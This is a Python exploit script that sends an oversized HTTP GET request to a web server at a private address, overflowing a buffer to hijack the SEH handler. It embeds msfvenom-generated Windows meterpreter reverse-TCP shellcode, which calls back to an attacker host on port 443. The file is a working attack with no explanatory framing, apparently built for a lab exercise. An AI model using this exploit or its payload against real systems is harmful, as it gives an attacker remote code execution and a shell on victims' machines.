#!/usr/bin/python3

import socket
import sys
from struct import pack


#msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.107 LPORT=443 -b"\x00\x0a\x0d\x09\x20" -f py -v shellcode
#Payload size: 381 bytes
#Final size of py file: 2136 bytes
shellcode = b"\x90"*24
shellcode +=  b""
shellcode += b"\xb8\xb6\xda\x9b\xb4\xd9\xc5\xd9\x74\x24\xf4"
shellcode += b"\x5d\x33\xc9\xb1\x59\x83\xc5\x04\x31\x45\x10"
shellcode += b"\x03\x45\x10\x54\x2f\x67\x5c\x17\xd0\x98\x9d"
shellcode += b"\x47\xe0\x4a\x14\x62\x66\xe0\x75\x5c\xec\xa4"
shellcode += b"\x75\x17\xa0\x5c\x89\x90\x0f\x7b\xa4\x21\x04"
shellcode += b"\xf1\xee\xec\xdb\x5a\xd2\x6f\xa0\xa0\x07\x4f"
shellcode += b"\x99\x6a\x5a\x8e\xde\x3c\x10\x7f\xb2\x35\x88"
shellcode += b"\x6f\xb8\x08\x11\x8e\x6e\x07\x29\xe8\x0b\xd8"
shellcode += b"\xfd\x7c\x58\xd8\xd1\xf7\x38\xfa\x5a\x4f\xa1"
shellcode += b"\xaa\x5d\x9c\x54\x83\x2a\x1e\x66\xeb\x9a\xd5"
shellcode += b"\xbc\x98\x1c\x3f\x8d\x5e\xdf\x70\xe3\xf2\xe1"
shellcode += b"\x49\xc4\xea\x97\xa1\x36\x96\xaf\x72\x44\x4c"
shellcode += b"\x25\x64\xee\x07\x9d\x40\x0e\xcb\x78\x03\x1c"
shellcode += b"\xa0\x0f\x4b\x01\x37\xc3\xe0\x3d\xbc\xe2\x26"
shellcode += b"\xb4\x86\xc0\xe2\x9c\x5d\x68\xb3\x78\x33\x95"
shellcode += b"\xa3\x25\xec\x33\xa8\xc4\xfb\x44\x51\x17\x04"
shellcode += b"\x19\xc5\xdb\xc9\xa2\x15\x74\x59\xd0\x27\xdb"
shellcode += b"\xf1\x7e\x0b\x94\xdf\x79\x1a\xb2\xdf\x56\xa4"
shellcode += b"\xd3\x21\x57\xd4\xfa\xe5\x03\x84\x94\xcc\x2b"
shellcode += b"\x4f\x65\xf0\xf9\xe5\x6f\x66\xc2\x51\x57\x1d"
shellcode += b"\xaa\xa3\xa8\xe0\x91\x2a\x4e\xb2\xb5\x7c\xdf"
shellcode += b"\x73\x66\x3c\x8f\x1b\x6c\xb3\xf0\x3c\x8f\x1e"
shellcode += b"\x99\xd7\x60\xf6\xf1\x4f\x18\x53\x89\xee\xe5"
shellcode += b"\x4e\xf7\x31\x6d\x7a\x07\xff\x86\x0f\x1b\xe8"
shellcode += b"\xf0\xef\xe3\xe9\x94\xef\x89\xed\x3e\xb8\x25"
shellcode += b"\xec\x67\x8e\xe9\x0f\x42\x8d\xee\xf0\x13\xa7"
shellcode += b"\x85\xc7\x81\x87\xf1\x27\x46\x07\x02\x7e\x0c"
shellcode += b"\x07\x6a\x26\x74\x54\x8f\x29\xa1\xc9\x1c\xbc"
shellcode += b"\x4a\xbb\xf1\x17\x23\x41\x2f\x5f\xec\xba\x1a"
shellcode += b"\xe3\xeb\x44\xd8\xcc\x53\x2c\x22\x4d\x64\xac"
shellcode += b"\x48\x4d\x34\xc4\x87\x62\xbb\x24\x67\xa9\x94"
shellcode += b"\x2c\xe2\x3c\x56\xcd\xf3\x14\x36\x53\xf3\x9b"
shellcode += b"\xe3\x64\x8e\xd4\x14\x85\x6f\xfd\x70\x86\x6f"
shellcode += b"\x01\x87\xbb\xb9\x38\xfd\xfa\x79\x7f\x0e\x49"
shellcode += b"\xdf\xd6\x85\xb1\x73\x28\x8c"

buffer = b"\x41"*1787		#2487
buffer += b"\x90"*24
buffer += shellcode
buffer += b"\x90"*(2487 - len(buffer))
#[*] Exact match at offset 491
buffer += b"\x90\x90\xeb\x12"				#nseh
buffer += pack("<L",0x1014ede0)			#seh pop pop ret 
buffer += b"\x90"*24
buffer += b"\x31\xC9\x85\xC9\x0F\x84\x3E\xFD\xFF\xFF"
buffer += b"\x43"*(5000 - len(buffer))


payload = buffer

req =  b"GET /"+ payload +b" HTTP/1.1\r\n"
req += b"Host: 192.168.56.102\r\n"
req += b"Upgrade-Insecure-Requests: 1\r\n"
req += b"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36\r\n"
req += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\n"
req += b"Referer: http://192.168.56.102/\r\n"
req += b"Accept-Encoding: gzip, deflate, br\r\n"
req += b"Accept-Language: en-US,en;q=0.9\r\n"
req += b"Connection: close\r\n\r\n"
#req += b"w00tw00t"+b"\x44"*400

target = ("192.168.56.102",80)

with socket.create_connection(target) as sock:
	sent = sock.send(req)
	print(f"[+]payload sended {sent} bytes")
print("[+]Done")

